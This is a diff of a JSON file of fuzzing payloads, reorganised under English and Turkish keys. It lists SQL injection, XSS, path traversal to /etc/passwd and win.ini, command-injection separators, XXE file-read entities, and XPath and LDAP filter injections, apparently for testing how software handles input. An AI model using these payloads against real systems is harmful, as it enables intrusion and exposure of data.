@@ -1,73 +1,148 @@
 {
-  "SQL Escape & Query Boundaries": {
-    "Standard Quote Escape": "' OR '1'='1",
-    "Double Quote Escape": "\" OR \"1\"=\"1",
-    "Parentheses Nesting Escape": "') OR ('1'='1",
-    "Standard Comment Line": "' --",
-    "MySQL Hash Comment": "' #",
-    "Union Select Column Probe 1": "' UNION SELECT NULL--",
-    "Union Select Column Probe 2": "' UNION SELECT NULL,NULL--",
-    "Union Select Column Probe 3": "' UNION SELECT NULL,NULL,NULL--",
-    "Union Select Column Probe 4": "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "Union Select Column Probe 5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-    "Database Brand Fingerprint": "' OR VERSION() > 1--",
-    "Stacked Query Separator": "'; SELECT 1;--"
+  "en": {
+    "SQL Escape & Query Boundaries": {
+      "Standard Quote Escape": "' OR '1'='1",
+      "Double Quote Escape": "\" OR \"1\"=\"1",
+      "Parentheses Nesting Escape": "') OR ('1'='1",
+      "Standard Comment Line": "' --",
+      "MySQL Hash Comment": "' #",
+      "Union Select Column Probe 1": "' UNION SELECT NULL--",
+      "Union Select Column Probe 2": "' UNION SELECT NULL,NULL--",
+      "Union Select Column Probe 3": "' UNION SELECT NULL,NULL,NULL--",
+      "Union Select Column Probe 4": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "Union Select Column Probe 5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "Database Brand Fingerprint": "' OR VERSION() > 1--",
+      "Stacked Query Separator": "'; SELECT 1;--"
+    },
+    "XSS & HTML Sanitization": {
+      "Basic Script Tag": "<script>alert(1)</script>",
+      "Script Tag with Script Source": "<script src=\"data:text/javascript,alert(1)\"></script>",
+      "Nested Script Tag Bypass": "<scr<script>ipt>alert(1)</script>",
+      "Image Tag Error Trigger": "<img src=x onerror=alert(1)>",
+      "Body Tag Onload Trigger": "<body onload=alert(1)>",
+      "SVG Loaded Vector": "<svg onload=alert(1)>",
+      "Iframe JavaScript URL Source": "<iframe src=\"javascript:alert(1)\"></iframe>",
+      "Input Tag Focus Trigger": "<input autofocus onfocus=alert(1)>",
+      "Link Anchor Tag Javascript Protocol": "<a href=\"javascript:alert(1)\">Click me</a>",
+      "XSLT Stylesheet Processing": "<?xml-stylesheet type=\"text/xsl\" href=\"#\"?>",
+      "JavaScript Literal Escapes": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+    },
+    "Directory Traversal & Paths": {
+      "Unix Basic Traversal": "../",
+      "Unix Deep Traversal": "../../../../../etc/passwd",
+      "Windows System Root File Access": "../../../../../windows/win.ini",
+      "URL Encoded Traversal Dot": "%2e%2e%2f",
+      "Double URL Encoded Traversal Dot": "%252e%252e%252f",
+      "Unicode Traversal Slash": "..%c0%af",
+      "Overlong UTF-8 Slash Bypass": "..%c1%9c",
+      "Null Byte Terminated Path": "../../../../../etc/passwd\u0000.jpg",
+      "UNC Path Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini"
+    },
+    "OS Command Boundaries": {
+      "Semicolon Command Linker": "; id ;",
+      "Pipe Output Forwarder": "| id |",
+      "Double Ampersand Logical Linker": "&& id &&",
+      "Double Pipe Logical Linker": "|| id ||",
+      "Subshell Interpolation Command": "$(id)",
+      "Backtick Shell Evaluation": "`id`",
+      "New Line Command Chain": "\nid\n",
+      "Carriage Return Linker": "\rid\r"
+    },
+    "Format Violations & Overflows": {
+      "Buffer Length (256 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "Buffer Length (1024 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "Invalid IP Address Format": "999.999.999.999",
+      "Invalid Email Double Dot": "user@domain..com",
+      "Negative Number Boundary": "-1",
+      "Zero Value Boundary": "0",
+      "Floating Point Precision Limit": "0.00000000000000000000000000000000000000000000000000000000000000000000001",
+      "Extremely Large Numeric Value": "99999999999999999999999999999999999999999999999999999999999999999999999999999",
+      "Unicode/Emoji Stress Characters": "𠜎 𠜱 𠝹 𠱓 𠱸 𠲖 𠲧 𠲼 𠵏 𠵘 𠵨 𠵫 𠵴 𠶧 𠶯 𠶳 𠶴 𠷔 𠷘 𠷤 𠷪 𠷯 𠷿 𠸎 𠸏 𠸖 𠸞 𠸢 𠸧 𠸫 𠸫 𠸱 𠸶 𠸷 𠸹 𠹊 𠹏 𠹗 𠹷 𠹻 𠺕 𠺖 𠺡 𠺢 𠺧 𠺨 𠺬 𠻗 𠻘 𠻤 𠻥 𠻪 𠻬 𠻱 𠻴 𠻵",
+      "Null Byte String Injection": "test\u0000value"
+    },
+    "XML & XPath Escapes": {
+      "Basic XML Tag Inject": "<xml>test</xml>",
+      "XPath Boolean Bypass": "' or 1=1 or ''='",
+      "XPath Element Inject": "'] | //* | ['",
+      "XML External Entity Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><value>&ent;</value>",
+      "XML Local File System Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>"
+    },
+    "LDAP Search Boundaries": {
+      "LDAP Boolean Query True": "*)(objectClass=*",
+      "LDAP Filter Inject": "*))(|(uid=*"
+    }
   },
-  "XSS & HTML Sanitization Tests": {
-    "Basic Script Tag": "<script>alert(1)</script>",
-    "Script Tag with Script Source": "<script src=\"data:text/javascript,alert(1)\"></script>",
-    "Nested Script Tag Bypass": "<scr<script>ipt>alert(1)</script>",
-    "Image Tag Error Trigger": "<img src=x onerror=alert(1)>",
-    "Body Tag Onload Trigger": "<body onload=alert(1)>",
-    "SVG Loaded Vector": "<svg onload=alert(1)>",
-    "Iframe JavaScript URL Source": "<iframe src=\"javascript:alert(1)\"></iframe>",
-    "Input Tag Focus Trigger": "<input autofocus onfocus=alert(1)>",
-    "Link Anchor Tag Javascript Protocol": "<a href=\"javascript:alert(1)\">Click me</a>",
-    "XSLT Stylesheet Processing": "<?xml-stylesheet type=\"text/xsl\" href=\"#\"?>",
-    "JavaScript Literal Escapes": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
-  },
-  "Directory Traversal & Path Boundaries": {
-    "Unix Basic Traversal": "../",
-    "Unix Deep Traversal": "../../../../../etc/passwd",
-    "Windows System Root File Access": "../../../../../windows/win.ini",
-    "URL Encoded Traversal Dot": "%2e%2e%2f",
-    "Double URL Encoded Traversal Dot": "%252e%252e%252f",
-    "Unicode Traversal Slash": "..%c0%af",
-    "Overlong UTF-8 Slash Bypass": "..%c1%9c",
-    "Null Byte Terminated Path": "../../../../../etc/passwd\u0000.jpg",
-    "UNC Path UNC Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini"
-  },
-  "OS Command Boundary Characters": {
-    "Semicolon Command Linker": "; id ;",
-    "Pipe Output Forwarder": "| id |",
-    "Double Ampersand Logical Linker": "&& id &&",
-    "Double Pipe Logical Linker": "|| id ||",
-    "Subshell Interpolation Command": "$(id)",
-    "Backtick Shell Evaluation": "`id`",
-    "New Line Command Chain": "\nid\n",
-    "Carriage Return Linker": "\rid\r"
-  },
-  "Format Violations & Boundary Overflows": {
-    "Buffer Length (256 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
-    "Buffer Length (1024 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
-    "Invalid IP Address Format": "999.999.999.999",
-    "Invalid Email Double Dot": "user@domain..com",
-    "Negative Number Boundary": "-1",
-    "Zero Value Boundary": "0",
-    "Floating Point Precision Limit": "0.00000000000000000000000000000000000000000000000000000000000000000000001",
-    "Extremely Large Numeric Value": "99999999999999999999999999999999999999999999999999999999999999999999999999999",
-    "Unicode/Emoji Stress Characters": "𠜎 𠜱 𠝹 𠱓 𠱸 𠲖 𠲧 𠲼 𠵏 𠵘 𠵨 𠵫 𠵴 𠶧 𠶯 𠶳 𠶴 𠷔 𠷘 𠷤 𠷪 𠷯 𠷿 𠸎 𠸏 𠸖 𠸞 𠸢 𠸧 𠸫 𠸫 𠸱 𠸶 𠸷 𠸹 𠹊 𠹏 𠹗 𠹷 𠹻 𠺕 𠺖 𠺡 𠺢 𠺧 𠺨 𠺬 𠻗 𠻘 𠻤 𠻥 𠻪 𠻬 𠻱 𠻴 𠻵",
-    "Null Byte String Injection": "test\u0000value"
-  },
-  "XML & XPath Escapes": {
-    "Basic XML Tag Inject": "<xml>test</xml>",
-    "XPath Boolean Bypass": "' or 1=1 or ''='",
-    "XPath Element Inject": "'] | //* | ['",
-    "XML External Entity Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><value>&ent;</value>",
-    "XML Local File System Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>"
-  },
-  "LDAP Search Boundaries": {
-    "LDAP Boolean Query True": "*)(objectClass=*",
-    "LDAP Filter Inject": "*))(|(uid=*"
+  "tr": {
+    "SQL Kaçış & Sorgu Sınırları": {
+      "Standart Tırnak Kaçışı": "' OR '1'='1",
+      "Çift Tırnak Kaçışı": "\" OR \"1\"=\"1",
+      "Parantezli Sorgu Kaçışı": "') OR ('1'='1",
+      "Standart Yorum Satırı": "' --",
+      "MySQL Diyez Yorum Satırı": "' #",
+      "Union Kolon Tespiti 1": "' UNION SELECT NULL--",
+      "Union Kolon Tespiti 2": "' UNION SELECT NULL,NULL--",
+      "Union Kolon Tespiti 3": "' UNION SELECT NULL,NULL,NULL--",
+      "Union Kolon Tespiti 4": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "Union Kolon Tespiti 5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "Veritabanı Sürüm Tespiti": "' OR VERSION() > 1--",
+      "Çoklu Sorgu Ayırıcı": "'; SELECT 1;--"
+    },
+    "XSS & HTML Temizleme": {
+      "Temel Script Etiketi": "<script>alert(1)</script>",
+      "Script Kaynaklı Script Etiketi": "<script src=\"data:text/javascript,alert(1)\"></script>",
+      "İç İçe Script Engeli Aşımı": "<scr<script>ipt>alert(1)</script>",
+      "Resim Yükleme Hata Tetikleyici": "<img src=x onerror=alert(1)>",
+      "Gövde Yükleme Tetikleyici": "<body onload=alert(1)>",
+      "SVG Yükleme Vektörü": "<svg onload=alert(1)>",
+      "Iframe JavaScript Bağlantısı": "<iframe src=\"javascript:alert(1)\"></iframe>",
+      "Odaklanma Tetikleyici Girdi": "<input autofocus onfocus=alert(1)>",
+      "Anchor Javascript Protokolü": "<a href=\"javascript:alert(1)\">Click me</a>",
+      "XSLT Stil Şablonu İşleme": "<?xml-stylesheet type=\"text/xsl\" href=\"#\"?>",
+      "JavaScript Harf Kaçışları": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+    },
+    "Dizin Gezinti & Dosya Yolları": {
+      "Unix Basit Dizin Gezinti": "../",
+      "Unix Derin Dizin Gezinti": "../../../../../etc/passwd",
+      "Windows Sistem Dosyası Erişimi": "../../../../../windows/win.ini",
+      "URL Kodlu Gezinti Noktası": "%2e%2e%2f",
+      "Çift URL Kodlu Gezinti Noktası": "%252e%252e%252f",
+      "Unicode Kodlu Gezinti Eğik Çizgisi": "..%c0%af",
+      "Uzun UTF-8 Eğik Çizgi Aşımı": "..%c1%9c",
+      "Null Byte Sonlandırmalı Yol": "../../../../../etc/passwd\u0000.jpg",
+      "UNC Ağ Paylaşım Yolu": "\\\\127.0.0.1\\c$\\windows\\win.ini"
+    },
+    "Sistem Komut Sınırları": {
+      "Noktalı Virgül Komut Zinciri": "; id ;",
+      "Dikey Çizgi Çıktı Yönlendirici": "| id |",
+      "Çift Ve Mantıksal Bağlayıcı": "&& id &&",
+      "Çift Veya Mantıksal Bağlayıcı": "|| id ||",
+      "Alt Kabuk Çalıştırma Komutu": "$(id)",
+      "Ters Tırnak Kabuk Çalıştırma": "`id`",
+      "Yeni Satır Komut Zinciri": "\nid\n",
+      "Satır Başı Karakter Bağlayıcı": "\rid\r"
+    },
+    "Format İhlalleri & Aşım Testleri": {
+      "Arabellek Uzunluğu (256 A)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "Arabellek Uzunluğu (1024 A)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "Geçersiz IP Adresi Formatı": "999.999.999.999",
+      "Geçersiz E-Posta Çift Nokta": "user@domain..com",
+      "Negatif Sayı Sınır Testi": "-1",
+      "Sıfır Değeri Sınır Testi": "0",
+      "Ondalıklı Sayı Hassasiyet Sınırı": "0.00000000000000000000000000000000000000000000000000000000000000000000001",
+      "Aşırı Büyük Sayı Sınır Testi": "99999999999999999999999999999999999999999999999999999999999999999999999999999",
+      "Unicode/Emoji Stres Karakterleri": "𠜎 𠜱 𠝹 𠱓 𠱸 𠲖 𠲧 𠲼 𠵏 𠵘 𠵨 𠵫 𠵴 𠶧 𠶯 𠶳 𠶴 𠷔 𠷘 𠷤 𠷪 𠷯 𠷿 𠸎 𠸏 𠸖 𠸞 𠸢 𠸧 𠸫 𠸫 𠸱 𠸶 𠸷 𠸹 𠹊 𠹏 𠹗 𠹷 𠹻 𠺕 𠺖 𠺡 𠺢 𠺧 𠺨 𠺬 𠻗 𠻘 𠻤 𠻥 𠻪 𠻬 𠻱 𠻴 𠻵",
+      "Null Byte Karakter Enjeksiyonu": "test\u0000value"
+    },
+    "XML & XPath Kaçışları": {
+      "Temel XML Etiketi Enjeksiyonu": "<xml>test</xml>",
+      "XPath Boolean Atlama": "' or 1=1 or ''='",
+      "XPath Eleman Enjeksiyonu": "'] | //* | ['",
+      "XML Dış Varlık XML Atağı (XXE)": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><value>&ent;</value>",
+      "XML Yerel Dosya Sistemi Atağı": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>"
+    },
+    "LDAP Arama Sınırları": {
+      "LDAP Doğru Filtre Atlaması": "*)(objectClass=*",
+      "LDAP Filtre Karakter Enjeksiyonu": "*))(|(uid=*"
+    }
   }
 }
